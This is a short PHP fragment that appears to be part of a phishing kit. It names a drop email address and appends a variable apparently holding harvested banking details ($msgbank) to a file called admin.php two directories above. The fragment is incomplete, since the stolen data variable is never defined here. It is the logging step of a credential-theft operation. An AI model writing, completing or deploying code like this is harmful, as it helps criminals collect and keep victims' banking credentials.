<?php

$yourmail  = 'namemand0@yandex.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>